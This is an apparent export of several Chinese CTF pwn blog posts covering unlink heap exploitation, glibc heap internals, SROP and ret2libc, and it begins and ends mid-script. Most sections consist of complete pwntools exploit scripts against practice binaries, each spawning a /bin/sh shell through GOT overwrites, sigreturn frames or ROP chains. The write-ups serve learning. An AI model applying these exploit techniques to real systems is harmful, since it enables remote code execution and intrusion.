b\u0026#34;3\u0026#34;) io.sendlineafter(b\u0026#34;Please enter the index of item:\u0026#34;, str(index).encode()) io.sendlineafter(b\u0026#34;Please enter the length of item name:\u0026#34;, str(length).encode()) io.sendlineafter(b\u0026#34;Please enter the new name of the item:\u0026#34;, data) # 4 -\u0026gt; 删除item def remove(index): io.sendlineafter(b\u0026#34;Your choice:\u0026#34;, b\u0026#34;4\u0026#34;) io.sendlineafter(b\u0026#34;Please enter the index of item:\u0026#34;, str(index).encode()) def dbg(msg): print(msg) gdb.attach(io) pause() add(0x80, b\u0026#34;aaaaaaaa\u0026#34;) # chunk_0 add(0x80, b\u0026#34;bbbbbbbb\u0026#34;) # chunk_1 add(0x80, b\u0026#34;cccccccc\u0026#34;) # chunk_2 chunk_ptr = 0x6020c8 # .bss fake_fd = chunk_ptr - 0x18 # FD-\u0026gt;bk +0x18 fake_bk = chunk_ptr - 0x10 # BK-\u0026gt;fd -0x10 payload = p64(0) + p64(0x81) + p64(fake_fd) + p64(fake_bk) padding = 0x80 - len(payload) payload += b\u0026#39;a\u0026#39; * padding # data填充完毕，开始溢出 payload += p64(0x80) # fake_pre_size payload += p64(0x90) # fake_size标记上一个chunk为free状态 change(0, len(payload), payload) # 将chunk_0的数据溢出到chunk_1 remove(1) # free chunk_1 atoi_got_addr = elf.got[\u0026#39;atoi\u0026#39;] success(f\u0026#34;atoi_got_addr:{hex(atoi_got_addr)}\u0026#34;) # atoi的got地址 payload = p64(0) * 3 + p64(atoi_got_addr) change(0, len(payload), payload) # 第一次编辑数据，修改目标地址为atoi的got表地址 show() atoi_addr = u64(io.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) success(f\u0026#34;atoi_addr:{hex(atoi_addr)}\u0026#34;) atoi_offset = libc.sym[\u0026#34;atoi\u0026#34;] system_offset = libc.sym[\u0026#34;system\u0026#34;] system_addr = atoi_addr - atoi_offset + system_offset # 计算system地址 success(f\u0026#34;system_addr:{hex(system_addr)}\u0026#34;) change(0, 8, p64(system_addr)) # 第二次编辑数据，修改atoi地址为system地址 io.sendline(b\u0026#34;/bin/sh\\0\u0026#34;) # 调用atoi(\u0026#34;/bin/sh\u0026#34;)实则调用system(\u0026#34;/bin/sh\u0026#34;) io.interactive() stkof main 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 __int64 __fastcall main(int a1, char **a2, char **a3) { int choice; // eax int res; // [rsp+Ch] [rbp-74h] char nptr[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 canary; // [rsp+78h] [rbp-8h] canary = __readfsqword(0x28u); alarm(0x78u); while ( fgets(nptr, 10, stdin) ) { choice = atoi(nptr); if ( choice == 2 ) { res = edit(); goto LABEL_14; } if ( choice \u0026gt; 2 ) { if ( choice == 3 ) { res = delete(); goto LABEL_14; } if ( choice == 4 ) { res = show(); goto LABEL_14; } } else if ( choice == 1 ) { res = add(); goto LABEL_14; } res = -1; LABEL_14: if ( res ) puts(\u0026#34;FAIL\u0026#34;); else puts(\u0026#34;OK\u0026#34;); fflush(stdout); } return 0LL; } add 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 __int64 sub_400936() { __int64 size; // [rsp+0h] [rbp-80h] char *ptr; // [rsp+8h] [rbp-78h] char s[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 canary_4; // [rsp+78h] [rbp-8h] canary_4 = __readfsqword(0x28u); fgets(s, 16, stdin); size = atoll(s); ptr = (char *)malloc(size); if ( !ptr ) return 0xFFFFFFFFLL; (\u0026amp;::s)[++num] = ptr; // 解析全部变量s，在偏移量的位置写入指针，类似数组的操作 printf(\u0026#34;%d\\n\u0026#34;, (unsigned int)num); // 输出数量大小，相当于add成功次数 return 0LL; } edit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 __int64 sub_4009E8() { int i; // eax unsigned int offset; // [rsp+8h] [rbp-88h] __int64 n; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s[104]; // [rsp+20h] [rbp-70h] BYREF unsigned __int64 canary_1; // [rsp+88h] [rbp-8h] canary_1 = __readfsqword(0x28u); fgets(s, 16, stdin); offset = atol(s); if ( offset \u0026gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !(\u0026amp;::s)[offset] ) // 检查是否有数据，没有数据代表没有add过 return 0xFFFFFFFFLL; fgets(s, 16, stdin); n = atoll(s); ptr = (\u0026amp;::s)[offset]; for ( i = fread(ptr, 1uLL, n, stdin); i \u0026gt; 0; i = fread(ptr, 1uLL, n, stdin) ) { ptr += i; // 存在溢出漏洞 n -= i; } if ( n ) return 0xFFFFFFFFLL; else return 0LL; } delete 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 __int64 sub_400B07() { unsigned int offset_v1; // [rsp+Ch] [rbp-74h] char s[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 canary_2; // [rsp+78h] [rbp-8h] canary_2 = __readfsqword(0x28u); fgets(s, 16, stdin); offset_v1 = atol(s); if ( offset_v1 \u0026gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !(\u0026amp;::s)[offset_v1] ) return 0xFFFFFFFFLL; free((\u0026amp;::s)[offset_v1]); (\u0026amp;::s)[offset_v1] = 0LL; // 指针free后置0，正常的删除流程 return 0LL; } show 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 __int64 sub_400BA9() { unsigned int offset_v1; // [rsp+Ch] [rbp-74h] char s[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 canary_3; // [rsp+78h] [rbp-8h] canary_3 = __readfsqword(0x28u); fgets(s, 16, stdin); offset_v1 = atol(s); if ( offset_v1 \u0026gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !(\u0026amp;::s)[offset_v1] ) return 0xFFFFFFFFLL; if ( strlen((\u0026amp;::s)[offset_v1]) \u0026lt;= 3 ) puts(\u0026#34;//TODO\u0026#34;); // 这个输出约等于没有...... else puts(\u0026#34;...\u0026#34;); return 0LL; } 思路 总体上就三个功能，malloc free edit，没有后门函数，需要\nexp 有无缓冲区别 ELF文件更换glibc版本和动态链接器 patchelf 1 2 3 4 # 更换ld文件 patchelf --set-interpreter /home/zhuwenxiu/personal_file/glibc/2.23/64/lib/ld-2.23.so elf_file # 更换libc文件 patchelf --replace-needed libc.so.6 /home/zhuwenxiu/personal_file/glibc/2.23/64/lib/libc-2.23.so elf_file 1 patchelf --set-interpreter /home/zhuwenxiu/personal_file/glibc/2.23/64/lib/ld-2.23.so --set-rpath /home/zhuwenxiu/personal_file/glibc/2.23/64/lib elf_file 环境变量LD_PRELOAD\u0026amp;\u0026amp;LD_LIBRARY_PATH 1 2 # 强行预加载指定共享库 LD_PRELOAD=/home/zhuwenxiu/personal_file/glibc/2.23/64/lib/libc-2.23.so elf_file 1 2 # 指定动态链接库的搜索路径 LD_LIBRARY_PATH=/home/zhuwenxiu/personal_file/glibc/2.23/64/lib elf_file 不是很管用\u0026hellip;\u0026hellip;\n","date":"2024-10-27T18:56:15+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/unlink/","title":"Unlink"},{"content":"heap chunk结构 chunk是堆管理中内存分配的基本单元\nlinux的malloc具体实现在glibc中，chunk头部信息结构体如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 struct malloc_chunk { // 前一个chunk的大小，当前一个chunk释放时堆管理器可以通过这个字段访问并合并前一个空闲块，是内存相邻的 INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ // 当前chunk总大小 INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ // 下一个空闲chunk，是链表相邻的 struct malloc_chunk* fd; /* double links -- used only if free. */ // 上一个空闲chunk struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ // 指向大小略大于当前chunk的下一个空闲chunk struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ // 指向大小略小于当前chunk的上一个空闲chunk struct malloc_chunk* bk_nextsize; }; INTERNAL_SIZE_T本质上就是unsigned int fd和bk通常用于管理空闲chunk链表，这使得内存管理器可以快速找到和操作空闲内存块 fd_nextsize和bk_nextsize字段用于优化大块内存的管理，通过按大小排序的链表提高查找效率 另外在glibc的堆实现中mchunk_size不仅包含chunk的大小，还包含三个标志位\n三个标志位用来表示存储标志信息，为什么会有这三个标志位？\n以16字节对齐为例，在内存对齐的背景下chunk的最低四位为0000，从右往左数第一、二、三位就是三个标志位即AMP\nPREV_INUSE(P)\n标志当前chunk的前一个chunk是否在使用中，1为分配，0为空闲\nIS_MMAPPED(M)\n标志当前chunk是否通过mmap分配\nNON_MAIN_ARENA(A)\n标志当前chunk是否位于主堆区域之外，即是否在main_arena\n获取实际chunk大小只需要屏蔽最低三位\n1 2 3 4 5 6 7 #define PREV_INUSE 0x1 // P #define IS_MMAPPED 0x2 // M #define NON_MAIN_ARENA 0x4 // A #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) // 获取实际大小 size_t actual_size = mchunk_size \u0026amp; ~SIZE_BITS; 没有被free的chunk\nfree\u0026amp;bins bins是一种用于管理和组织chunk的数据结构，当chunk被free后会放入合适的bins中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 struct malloc_state { /* Serialize access. */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ int have_fastchunks; /* Fastbins */ // typedef struct malloc_chunk* mchunkptr; mfastbinptr fastbinsY[NFASTBINS]; // 指针数组，指向不同大小的fastbins链表 /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; // 指向堆的最顶端 /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; // 指向最近一次小内存请求剩余的空间，用于减少碎片化 /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; // 指向普通bins /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; // 指向下一个malloc_state /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; }; bins的分类有四种，分别是fastbins、unstored bin、small bins、large bins\nfastbinsY[NFASTBINS] 单向链表\n这个数组每一个元素都是指向链表头的指针，每个指针指向的都是fastbins，fastbins用于管理小且固定大小的chunk\n1 2 3 fastbinsY[0]: -\u0026gt; [16字节块1] -\u0026gt; [16字节块2] -\u0026gt; ... fastbinsY[1]: -\u0026gt; [32字节块1] -\u0026gt; [32字节块2] -\u0026gt; ... ... bins[NBINS * 2 - 2] 双向链表\n存储1个unstored bin头指针、62个small bins头指针、63个large bins头指针\n只有large bins被free后会有fd_nextsize和bk_nextsize，其余的bin只有fd和bk，这是因为large bins有排序的需求\nmalloc和free的实现原理解析 - JackTang\u0026rsquo;s Blog (jacktang816.github.io)\n内存分配 现在的linux系统的堆管理器通常是ptmalloc，这是基于早期的dlmalloc改进而来，在此基础上增加了多线程支持\n堆分配内存会涉及到多个系统调用\nbrk/sbrk\n主线程的arena即main_arena\n堆初始化的时候会划分一片堆空间，该空间称为main_arena，在申请较小的内存空间时会优先在main_arena上分配空间。当main_arena空间不足时会使用系统调用brk和sbrk来扩展空间\nbrk可控制最高地址的指针向高地址/低地址移动，实现堆内存空间变化\nsbrk直接改变堆空间大小\nmmap/mumap\n在申请较大的内存空间时通过mmap重新分配一个大的内存空间，通过mumap直接归还给操作系统而不是堆管理器(bins)\n【CTF】GLibc堆利用入门-机制介绍_哔哩哔哩_ bilibili\n","date":"2024-10-27T18:53:41+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/heap%E5%85%A5%E9%97%A8/","title":"Heap入门"},{"content":"SROP signal机制 基本流程就是当有中断或者异常产生时，内核会向某个进程发送一个signal，该进程挂起进入内核，内核为其保存上下文，然后在signal handle中进行处理哦，退出后内核依据之前保存的上下文恢复进程原来的状态\n这里有几个比较重要的地方\n进程的上下文保存的结构叫signal frame，保存在用户的地址空间中，用户具有读写的权限\nsignal frame中主要保存寄存器的状态和值，栈上的局部变量和函数调用信息，结构体如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // x86 struct sigcontext { unsigned short gs, __gsh; unsigned short fs, __fsh; unsigned short es, __esh; unsigned short ds, __dsh; unsigned long edi; unsigned long esi; unsigned long ebp; unsigned long esp; unsigned long ebx; unsigned long edx; unsigned long ecx; unsigned long eax; unsigned long trapno; unsigned long err; unsigned long eip; unsigned short cs, __csh; unsigned long eflags; unsigned long esp_at_signal; unsigned short ss, __ssh; struct _fpstate * fpstate; unsigned long oldmask; unsigned long cr2; }; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 // x64 struct _fpstate { /* FPU environment matching the 64-bit FXSAVE layout. */ __uint16_t cwd; __uint16_t swd; __uint16_t ftw; __uint16_t fop; __uint64_t rip; __uint64_t rdp; __uint32_t mxcsr; __uint32_t mxcr_mask; struct _fpxreg _st[8]; struct _xmmreg _xmm[16]; __uint32_t padding[24]; }; struct sigcontext { __uint64_t r8; __uint64_t r9; __uint64_t r10; __uint64_t r11; __uint64_t r12; __uint64_t r13; __uint64_t r14; __uint64_t r15; __uint64_t rdi; __uint64_t rsi; __uint64_t rbp; __uint64_t rbx; __uint64_t rdx; __uint64_t rax; __uint64_t rcx; __uint64_t rsp; __uint64_t rip; __uint64_t eflags; unsigned short cs; unsigned short gs; unsigned short fs; unsigned short __pad0; __uint64_t err; __uint64_t trapno; __uint64_t oldmask; __uint64_t cr2; __extension__ union { struct _fpstate * fpstate; __uint64_t __fpstate_word; }; __uint64_t __reserved1 [8]; }; 假设可以控制一个signal frame那么就可以随意控制寄存器的值，从而执行任意命令\n最终就是要调用execve(\u0026quot;/bin/sh\u0026quot;, 0, 0)\n在64位下要求rax=59,rdi=/bin/sh,rsi=0,rdx=0\nsmallest 检查 反汇编 1 2 3 4 5 6 .text:00000000004000B0 xor rax, rax ; rax = 0 .text:00000000004000B3 mov edx, 400h ; count .text:00000000004000B8 mov rsi, rsp ; buf .text:00000000004000BB mov rdi, rax ; fd .text:00000000004000BE syscall ; LINUX - sys_read .text:00000000004000C0 retn 程序是64位的，rax置0进行syscall调用的是read，对应的三个参数通过寄存器传递\n1 2 ssize_t read(int fd, void *buf, size_t count); read(0, buf, 0x400); read往栈顶读取地址作为返回值，同时栈顶的地址取决于外界的输入，因此可以多输几次入口地址多次进行系统调用\n控制程序流程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.os = \u0026#39;linux\u0026#39; context.arch = \u0026#39;amd64\u0026#39; context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-v\u0026#34;] io = process(\u0026#34;./smallest\u0026#34;) def dbg(): gdb.attach(io, \u0026#39;b *0x4000be; continue\u0026#39;) # 下断点 pause() start_addr = 0x4000b0 syscall_addr = 0x4000be dbg() payload = p64(start_addr) * 4 io.send(payload) dbg() # 查看栈数据 gdb.attach(io, 'b *0x4000be; continue')中需要下断点的原因\n库函数本质上是对系统调用的多层封装，库函数的实现本身就调用了其它很多函数进行中断等待输入；在反汇编的代码中只有syscall，直接使用syscall 进行系统调用时，程序会进入内核态，执行系统调用。这个过程通常是同步的，不涉及中断。\nwrite(1, buf,0x400)泄露栈地址\nsigreturnFrame写入栈\n触发sigreturn调用read(0,leak_stack_addr,0x400)，再把execve的sigreturn写入栈\n再次输入15字节getshell\n整体流程 read(0,buf,0x400) \u0026ndash;\u0026gt; write(1,buf,0x400) \u0026ndash;\u0026gt; sigreturn \u0026ndash;\u0026gt; read(0,leak_stack_addr,0x400) \u0026ndash;\u0026gt; sigreturn \u0026ndash;\u0026gt; execve(\u0026quot;/bin/sh\u0026quot;,0,0)\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.os = \u0026#39;linux\u0026#39; context.arch = \u0026#39;amd64\u0026#39; context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-v\u0026#34;] io = process(\u0026#34;./smallest\u0026#34;) start_addr = 0x4000b0 syscall_addr = 0x4000be payload = p64(start_addr) * 3 io.send(payload) io.send(\u0026#39;\\xb3\u0026#39;) # 0x4000b3 mov edx,0x400 =\u0026gt; rax = 1 =\u0026gt; write(1,buf,0x400) leak_stack_addr = u64(io.recv()[8:16]) success(f\u0026#34;leak_stack_addr:{hex(leak_stack_addr)}\u0026#34;) # 返回到syscall_addr调用read(0,buf,0x400) read = SigreturnFrame() read.rax = constants.SYS_read # 0 read.rdi = 0 read.rsi = leak_stack_addr read.rdx = 0x400 read.rsp = leak_stack_addr read.rip = syscall_addr payload = p64(start_addr) + p64(syscall_addr) + bytes(read) io.send(payload) # 15 bytes =\u0026gt; rax = 15 =\u0026gt; sigreturn payload = p64(syscall_addr) + b\u0026#39;a\u0026#39; * 0x7 io.send(payload) # 返回到syscall_addr调用execve(\u0026#34;/bin/sh\u0026#34;,0,0) execve = SigreturnFrame() execve.rax = constants.SYS_execve # 59 execve.rdi = leak_stack_addr + 0x108 # /bin/sh的偏移 execve.rsi = 0x0 execve.rdx = 0x0 execve.rsp = leak_stack_addr execve.rip = syscall_addr payload = p64(start_addr) + p64(syscall_addr) + bytes(execve) print(len(payload)) payload += b\u0026#39;/bin/sh\\x00\u0026#39; # /bin/sh写入栈 io.send(payload) # 15 bytes =\u0026gt; rax = 15 =\u0026gt; sigreturn payload = p64(syscall_addr) + b\u0026#39;a\u0026#39; * 0x7 io.send(payload) io.interactive() 参考 SROP基本原理 | Ephemeral1yのBlog | CTF学习笔记 (ephemerally.top)\nSROP - CTF Wiki (ctf-wiki.org)\n","date":"2024-10-27T17:29:43+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/srop/","title":"Srop"},{"content":"ret2libc 源代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // ret2libc.c #include\u0026lt;stdio.h\u0026gt; int dofunc() { char data[8]={}; // 系统调用 write(1,\u0026#34;input:\u0026#34;,6); // puts(\u0026#34;input:\u0026#34;); read(0,data,0x100); // gets(data); return 0; } int main() { dofunc(); return 0; } 相比于ret2text这里没有了明显的后门system，要在libc中调用system\nx64 1 gcc ret2libc.c -fno-stack-protector -no-pie -o ret2libc_x64 system在libc中的相对地址是固定的，只要知道了libc的基地址就可以知道system的基地址，公式如下\nsystem_base_addr = libc_base_addr + system_offset_addr\n对于write也有\nwrite_base_addr = libc_base_addr + write_offset_addr\nGOT\u0026amp;PLT GOT (Global Offset Table)全局偏移表保存了程序在运行时需要访问的全局变量和函数的地址，它的主要作用是帮助程序在运行时正确访问这些地址，而不依赖于程序被加载到内存中的特定位置\nPLT(Procedure Linkage Table)过程链接表保存了调用外部函数的代码\n具体可以参考下面这两篇博客\nLinux/ELF動態鏈接部分機制(GOT\u0026amp;PLT) - HackMD\nGOT和PLT原理簡析-软件开发平台及语言笔记大全(超详细) (cntofu.com)\n动态链接\u0026amp;延迟绑定 程序第一次调用函数 程序跳到该函数的plt元素 该函数的plt元素对应到该函数的got元素 这里是跳到got的.got.plt部分，.got.plt是got和plt进行交互的部分 由于是第一次调用，这个时候还没有链接，从got返回到plt 之后plt跳到公共plt 公共plt呼叫动态链接器 在linux下一般是/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 动态链接器查询函数的内存地址，将该函数的got元素的内容改为函数的内存地址完成链接 后续调用该函数跳到plt，从plt跳到got就能得到函数的内存地址 下面两个特例没有上面的过程\n静态编译 RELRO（Relocation Read-Only）完全只读（-z now） RELRO RELRO 的目的是通过将某些部分的全局偏移表（GOT）标记为只读来防止重定位攻击。重定位攻击是指攻击者利用重定位表中的条目进行恶意代码重定向，从而执行任意代码。这个属性取决于gcc的参数-z\n-z now 开启完全只读，启动立即绑定，就没有上面的向动态链接器请求的过程了（至少手动查不到），完全只读什么都不能修改\n-z norelro 完全关闭只读，此时可以篡改plt和got，非常不安全\n默认是-z lazy也就是延迟绑定，此时只有.got.plt是不能修改的\n-z 其它参数都对链接器的链接行为有一定影响，具体情况具体分析\n思路 控制libc中的函数，通常是返回到该函数的plt\n为什么不直接跳到该函数的got去获得函数的内存地址？\n初次调用时got中还没有内存地址 plt负责管理函数的延迟绑定，直接跳到got会绕过这种的管理机制，以免造成预期以外的错误 总的来说就是要模拟程序正常查找函数的流程\n调用函数输出该函数的地址，根据偏移量算出libc的基地址\n基于libc基地址计算system和\u0026quot;/bin/sh\u0026quot;\n由于x64传参有寄存器参与需要gadget，手动编译的程序可用的gadget较少，这里用ctfshow的ret2libc_64做演示\n伪代码\n1 2 3 4 5 6 7 8 9 10 11 12 int __fastcall main(int argc, const char **argv, const char **envp) { __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); puts(\u0026#34;Pls Input\u0026#34;); memset(buf, 0, sizeof(buf)); read(0, buf, 0x100uLL); // 溢出 return 0; } 出现段错误\ngadget\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(root?kali)-[/mnt/hgfs/pwn/ret2libc/ctfshow] └─# ROPgadget --binary ret2libc_64 --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ 0x000000000040128c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x000000000040128e : pop r13 ; pop r14 ; pop r15 ; ret 0x0000000000401290 : pop r14 ; pop r15 ; ret 0x0000000000401292 : pop r15 ; ret 0x000000000040128b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x000000000040128f : pop rbp ; pop r14 ; pop r15 ; ret 0x000000000040115d : pop rbp ; ret 0x0000000000401293 : pop rdi ; ret 0x0000000000401291 : pop rsi ; pop r15 ; ret 0x000000000040128d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret 0x000000000040101a : ret 0x00000000004011ba : ret 0xfffe Unique gadgets found: 12 plt got\nexp 地址手动找\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.arch = \u0026#39;amd64\u0026#39; context.os = \u0026#39;linux\u0026#39; io = process(\u0026#39;./ret2libc_64\u0026#39;) padding = 0x168 - 0x140 pop_rdi_ret_addr = 0x401293 __libc_start_main_in_got = 0x403338 puts_in_plt = 0x401060 _start_addr = 0x401090 payload = b\u0026#39;a\u0026#39; * padding payload += p64(pop_rdi_ret_addr) payload += p64(__libc_start_main_in_got) payload += p64(puts_in_plt) payload += p64(_start_addr) io.recvuntil(\u0026#34;Pls Input\\n\u0026#34;) io.send(payload) #__libc_start_main_addr = u64(io.recv(8)) # 错误的地址，没有把多余的2字节置0 # 读取到\\x7f后停止,\\x7f是内存的地址的高位,取地址后6个低字节，用\\x00把地址填充到8字节 这些都是为了x64的16字节对齐 __libc_start_main_addr = u64(io.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8, b\u0026#39;\\x00\u0026#39;)) print(\u0026#34;__libc_start_main地址\u0026#34;, hex(__libc_start_main_addr)) __libc_start_main_offset = 0x27cc0 system_offset = 0x4dab0 bin_sh_offset = 0x197e34 __libc_base_addr = __libc_start_main_addr - __libc_start_main_offset print(\u0026#34;libc基地址\u0026#34;, hex(__libc_base_addr)) system_addr = __libc_base_addr + system_offset bin_sh_addr = __libc_base_addr + bin_sh_offset payload = b\u0026#39;a\u0026#39; * padding payload += p64(0x40101a) # ret的gadget用于平衡栈 payload += p64(pop_rdi_ret_addr) payload += p64(bin_sh_addr) payload += p64(system_addr) io.send(payload) io.interactive() 第二个payload没有指定返回地址是因为rop下程序的控制权转移，原来的返回地址就不重要了可以不用填 取得shell就不关心返回地址 解析elf文件找地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.arch = \u0026#39;amd64\u0026#39; context.os = \u0026#39;linux\u0026#39; # 解析目标程序，获取plt got rop file_path = \u0026#39;./ret2libc_64\u0026#39; elf = ELF(file_path) rop = ROP(elf) # 解析glibc，获取offset libc_path = \u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39; libc = ELF(libc_path) pop_rdi_ret_addr = rop.find_gadget([\u0026#39;pop rdi\u0026#39;, \u0026#39;ret\u0026#39;])[0] # 解析得到: 0x401293 __libc_start_main_in_got = elf.got[\u0026#39;__libc_start_main\u0026#39;] # 解析得到: 0x403338 puts_in_plt = elf.plt[\u0026#39;puts\u0026#39;] # 解析得到: 0x401060 _start_addr = elf.symbols[\u0026#39;_start\u0026#39;] # 解析得到: 0x401090 ret_gadget = rop.find_gadget([\u0026#39;ret\u0026#39;])[0] # 解析得到: 0x40101a # 唯一固定的溢出量 padding = 0x168 - 0x140 payload = b\u0026#39;a\u0026#39; * padding payload += p64(pop_rdi_ret_addr) payload += p64(__libc_start_main_in_got) payload += p64(puts_in_plt) payload += p64(_start_addr) io = process(\u0026#39;./ret2libc_64\u0026#39;) io.recvuntil(\u0026#34;Pls Input\\n\u0026#34;) io.send(payload) __libc_start_main_addr = u64(io.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8, b\u0026#39;\\x00\u0026#39;)) print(\u0026#34;__libc_start_main地址\u0026#34;, hex(__libc_start_main_addr)) __libc_start_main_offset = libc.symbols[\u0026#39;__libc_start_main\u0026#39;] # 解析得到: 0x27cc0 system_offset = libc.symbols[\u0026#39;system\u0026#39;] # 解析得到: 0x4dab0 bin_sh_offset = next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) # 解析得到: 0x197e34 __libc_base_addr = __libc_start_main_addr - __libc_start_main_offset print(\u0026#34;libc基地址\u0026#34;, hex(__libc_base_addr)) system_addr = __libc_base_addr + system_offset bin_sh_addr = __libc_base_addr + bin_sh_offset payload = b\u0026#39;a\u0026#39; * padding payload += p64(ret_gadget) payload += p64(pop_rdi_ret_addr) payload += p64(bin_sh_addr) payload += p64(system_addr) io.send(payload) io.interactive() 依赖现成的pwntools就能自动获取各个elf文件的信息，只要知道溢出的偏移量基本上就可以构造payload x86 1 gcc ret2lib.c -m32 -fno-stack-protector -no-pie -o ret2libc_x86 在alsr关闭下内存地址都是固定的，直接ret2text\nret2text_exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # ret2text_exp_x86.py from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.arch = \u0026#39;i386\u0026#39; context.os = \u0026#39;linux\u0026#39; file_path = \u0026#34;./ret2libc_x86\u0026#34; io = process(file_path) # 以下地址都是在alsr关闭的情况下找到的 # 这里的system和exit都是在libc中 padding = 0x2c - 0x18 system_addr = 0xf7c4dd10 exit_addr = 0xf7c3d230 bin_sh_addr = 0xf7db9dcd payload = padding * b\u0026#39;a\u0026#39; payload += p32(system_addr) payload += p32(exit_addr) payload += p32(bin_sh_addr) gdb.attach(io) io.sendafter(\u0026#34;input:\u0026#34;, payload) io.interactive() ret2libc_exp 这里已经显示__libc_start_main的内存地址，不过要输出到控制台让变量接收\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 # ret2libc_exp_x86.py from pwn import * from sys import exit def isFourBytes(leaked_data): global flag if len(leaked_data) == 4: __libc_start_main_addr = u32(leaked_data) print(hex(__libc_start_main_addr)) else: print(f\u0026#34;返回错误的数据长度: {len(leaked_data)}\u0026#34;) # 接收的字符长度不为4字节修改标志 flag = False context.log_level = \u0026#39;debug\u0026#39; context.arch = \u0026#39;i386\u0026#39; context.os = \u0026#39;linux\u0026#39; io = process(\u0026#34;./ret2libc_x86\u0026#34;) flag = True padding = 0xffffd32c - 0xffffd318 write_in_plt_addr = 0x8049050 _start_addr = 0x8049060 fd = 1 __libc_start_main_in_got = 0x804c000 length = 4 # 第一个payload # write(1,\u0026amp;__libc_start_main,4) ===\u0026gt; _start payload = padding * b\u0026#39;a\u0026#39; payload += p32(write_in_plt_addr) payload += p32(_start_addr) payload += p32(fd) payload += p32(__libc_start_main_in_got) payload += p32(length) io.recv() # 接收第一个input: io.sendline(payload) __libc_start_main_addr = io.recv(4) isFourBytes(__libc_start_main_addr) # 0xf7c23ca0 if flag: 